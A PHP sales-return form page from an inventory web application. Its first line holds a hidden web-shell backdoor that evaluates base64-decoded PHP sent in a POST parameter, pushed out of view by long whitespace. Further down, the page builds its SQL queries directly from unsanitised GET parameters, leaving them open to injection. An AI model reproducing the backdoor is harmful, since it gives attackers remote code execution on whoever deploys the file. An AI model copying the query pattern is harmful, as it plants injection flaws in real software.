<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n8a5222']));?><?php  include "config.php"; 
       include "jquery.php";
	   
	   
$date1 = date("d.m.Y"); 
$strdot1 = explode('.',$date1); 
$ignore = $strdot1[0]; 
$m = $strdot1[1];
$y = substr($strdot1[2],2,4);
$query1 = "SELECT MAX(sreincr) as sreincr FROM oc_Salesreturn where m = '$m' AND y = '$y' ORDER BY date DESC";
$result1 = mysql_query($query1,$conn); $preincr = 0; 
while($row1 = mysql_fetch_assoc($result1)) 
$sreincr = $row1['sreincr']; 
$sreincr = $sreincr + 1;
if ($sreincr < 10) 
$sre = 'SRE-'.$m.$y.'-000'.$sreincr; 
else if($sreincr < 100 && $sreincr >= 10) 
$sre = 'SRE-'.$m.$y.'-00'.$sreincr; 
else $sre = 'SRE-'.$m.$y.'-0'.$sreincr;

	   
	   
	   
	   if($_GET['name']<>"")
	   {
	   $name=$_GET['name'];
	   }
	   else
	   {
		$name="";
		   }
	   if($_GET['invoice']<>"")
	   {
		   $invoice=$_GET['invoice'];
		   }
	  else
	  {
		  $invoice="";
		  }
?>




<center>
<section class="grid_8">
  <div class="block-border">
  								
				
								
								
     <form class="block-content form" id="complex_form" name="form1" method="post" action="oc_savesalesreturn.php" onsubmit="return checkform(this);">				
<h1>Sales Return</h1>&nbsp;&nbsp;&nbsp;&nbsp;

<br />


<b>Sales Return</b>
<br />


(Fields marked <font style="color:red;font-weight:bold;padding-top:10px"><sup>*</sup></font> are mandatory)

<br />
<br />
<br />



<br />
<br />

<input type="hidden" name="preincr" id="preincr" value="<?php echo $sreincr; ?>"/>
                <input type="hidden" name="m" id="m" value="<?php echo $m; ?>"/>
                <input type="hidden" name="y" id="y" value="<?php echo $y; ?>"/>

<table id="paraID" align="center" cellpadding="5" cellspacing="5">
<tr>

<td colspan="2"><strong>Date&nbsp;&nbsp;&nbsp;</strong>
<input type="text" size="10" id="date" class="datepicker" name="date" onchange="getsre()" value="<?php if($_GET['date']<>""){  echo date("d.m.Y",strtotime($_GET['date'])); } else {echo date("d.m.Y");}?>" >
</td>


<td colspan="2"><strong>SRE</strong>&nbsp;

<input size="14" type="text"  name="pre" id="pre" value="<?php echo $sre; ?>" readonly style="border:0px;background:none" />
</td>
<td width="10px"></td>


<td  colspan="2"><strong>Party Name</strong>&nbsp;
<select name="name" id="name" onchange="reloadpage();" style="width:140px">
<option value="">-Select-</option>
<?php      
          $query = "SELECT distinct(party) FROM oc_cobi where flag = 1 ORDER BY party ASC ";
           $result = mysql_query($query,$conn); 
           while($row1 = mysql_fetch_assoc($result))
           {
?>
<option title="<?php echo $row1['party']; ?>" value="<?php echo $row1['party']; ?>" <?php if($name == $row1['party']) { ?> selected="selected" <?php } ?>><?php echo $row1['party']; ?></option>
<?php } ?>
</select>
</td>
<td width="10px"></td>
<td colspan="2"><strong>COBI</strong>&nbsp;
<select name="cobi" id="cobi" onchange="reloadpage();" style="width:140px">
<option value="">-Select-</option>
<?php
	$query = "SELECT distinct(invoice) as invoice FROM oc_cobi where flag = 1 and party='$name' ORDER BY invoice ASC ";
    $result = mysql_query($query,$conn)or die(mysql_error()); 
    while($row1 = mysql_fetch_assoc($result))
      {
?>
	<option value="<?php echo $row1['invoice'];?>" <?php if($row1['invoice']==$invoice) { ?> selected="selected" <?php } ?> ><?php echo $row1['invoice']; ?> </option>
<?php
	  }
?>
</select>
</td>
<td width="10px"></td>

</tr>
</table>

<br /><br />
<table  align="center" cellpadding="10" cellspacing="10">
<tr>
<td><strong>Code</strong></td><td width="10px"></td>
<td><strong>Item Name</strong></td><td width="10px"></td>
<td><strong>Warehouse</strong></td><td width="10px"></td>
<td><strong>Balance Qty</strong></td><td width="10px"></td>
<td><strong>Returned<br />
Qty</strong><font style="color:red;font-weight:bold;padding-top:10px"><sup>*</sup></font></td><td width="10px"></td>
<td><strong>Goods Status</strong></td>
</tr>
<?php $i=0;

 
		       if($_SESSION['sectorall'] == "all" || ($_SESSION['sectorall'] == "" && $_SESSION['sectorlist'] == ""))
	{
         $sectorlist=""; 
	  
	 }
	 else
	 {
	 $sectorlist = $_SESSION['sectorlist'];
	 
	 }
		if($sectorlist=="")   
	$query = "SELECT `code`, `description`,`quantity`,`warehouse` FROM `oc_cobi` where flag = 1 and party='$name' and invoice='$invoice' ORDER BY code ASC ";
	
	else
	$query = "SELECT `code`, `description`,`quantity`,`warehouse` FROM `oc_cobi` where flag = 1 and party='$name' and invoice='$invoice' and warehouse in ($sectorlist) ORDER BY code ASC ";
	
    $result = mysql_query($query,$conn)or die(mysql_error()); 
    while($row1 = mysql_fetch_assoc($result))
      { $warehouse=$row1['warehouse'];


	$query2="select sum(quantity) as quantity from oc_salesreturn where cobi='$invoice' and party='$name'";
		$result2 = mysql_query($query2,$conn);
		$row2 = mysql_fetch_assoc($result2);
		$quantity=$row1['quantity']-$row2['quantity'];
?>
 <tr height="5px"></tr>
    <tr>
    <td>
    	<input type="text" id="code@<?php echo $i;?>" name="code[]" value="<?php echo $row1['code'];?>" style="background:none; border:none; text-align:center" align="middle" />
    </td><td width="10px"></td>
    <td>
    	<input type="text" id="itemname@<?php echo $i;?>" name="itemname[]" value="<?php echo $row1['description'];?>" style="background:none; border:none; text-align:center" align="middle" />
    </td><td width="10px"></td>
 <td>
    	<input type="text" id="warehouse@<?php echo $i;?>" name="warehouse[]" value="<?php echo $warehouse;?>" style="background:none; border:none; text-align:center" align="middle" />
    </td>
  <td width="10px"></td>
    <td>
    	<input type="text" id="balqty@<?php echo $i;?>" name="balqty[]" value="<?php echo $quantity;?>" style="background:none; border:none; text-align:center" align="middle" />
    </td><td width="10px"></td>
    <td>
    	<input type="text" id="retqty@<?php echo $i;?>" name="retqty[]" value="0" onkeyup="checkqty(<?php echo $i;?>)" size="6" />
    </td>
	<td width="10px"></td>
	<td>
	
	<select name="wastage[]" id="wastage@<?php echo $i;?>" >
	<option value="">--Select--</option>
	<option value="addtostock">Add To Stock</option>
	<option value="Wastage">Wastage</option>
	
	</select>
	
	</td>
	
	
    </tr>
<?php	
	$i=$i+1;}?>
	
</table>
<br>

<br>



<br />

<table border="0" align="center">

<td style="vertical-align:middle;"><strong>Remarks&nbsp;&nbsp;&nbsp;</strong></td>

<td>

<textarea id="remarks" cols="40"  rows="3" name="remarks"></textarea>

</td>

<td style="color:red;font-weight:bold;padding-top:10px">&nbsp;*Max 225 Characters</td>

</table>

<br />
<center>
<input type="submit" id="save" value="Save" onclick="return checkstatus();"  />&nbsp;&nbsp;<input type="button" id="cancel" value="Cancel" onClick="document.location = 'dashboardsub.php?page=oc_salesreturn';"/>
</center>
</form>
</div>
</section>
</center>
<br />
<br />

<script type="text/javascript">
function reloadpage()
{
	var name= document.getElementById("name").value;
	var cobi= document.getElementById("cobi").value;
	var date= document.getElementById("date").value;
	document.location = "dashboardsub.php?page=oc_addsalesreturn&name=" + name + "&invoice=" + cobi + "&date=" + date;
	}
function checkqty(a)
{
	if(Number(document.getElementById("balqty@"+a).value) < Number(document.getElementById("retqty@"+a).value) )
	{
		alert("Enterd Qty should be less then or equal to Balance qty");
		document.getElementById("retqty@"+a).value=0;
		document.getElementById("retqty@"+a).focus();
		}
	}
	
	
function checkstatus()
{
for(i=0;i<=<?php echo $i;?>;i++)
{
  //alert(document.getElementById("retqty@" + i).value);
  if(document.getElementById("retqty@" + i).value!=0)
  {
if(document.getElementById("wastage@" + i).value == "")
{
 alert("please select goods status");
 return false;
 }
}
 }
}

function checkform()
{
	var i="<?php echo $i;?>"; var x=0;
		for(var j=0;j<Number(i);j++)
		{
			x=x+Number(document.getElementById("retqty@"+j).value);
			}
		
		
		for(i=0;i<=<?php echo $i-1;?>;i++)
{

//if(document.getElementById("wastage@" + i).value == "")
//{
// alert("please select goods status");
// return false;
// }
 
 
 }
		
		return true;
	}
</script>